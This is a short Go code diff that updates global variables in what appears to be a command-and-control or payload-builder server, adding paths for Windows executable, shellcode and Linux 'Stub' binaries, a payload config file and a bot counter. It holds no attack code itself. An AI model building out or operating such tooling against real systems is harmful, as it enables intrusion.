@@ -8,17 +8,22 @@ import (
 )
 
 var (
-	Seed               = rand.New(rand.NewSource(time.Now().UnixNano()))
-	Cfg                = Config{}
-	Db         *sql.DB = nil
-	Version            = "v1.4.4"
-	Account            = 0
-	CurrentBot int64   = 5
-	Mutex      sync.Mutex
+	Seed             = rand.New(rand.NewSource(time.Now().UnixNano()))
+	Cfg              = Config{}
+	Db       *sql.DB = nil
+	Version          = "v1.5.4"
+	StubPath         = map[string]string{"winexe": "../bin/Stub",
+		"winshellcode": "../bin/Stub.bin",
+		"linux":        "../bin/Stub",
+	}
+	TaskCleanerIntervalSec       = 5 * 60
+	Account                      = 0
+	CurrentBot             int64 = 5
+	Mutex                  sync.Mutex
 )
 
 const ConfigDefaultFileName = "config.yaml"
-const StubPath = "./Stub/"
+const ConfigPayloadDefaultFileName = "payload.yaml"
 
 type Config struct {
 	Server struct {
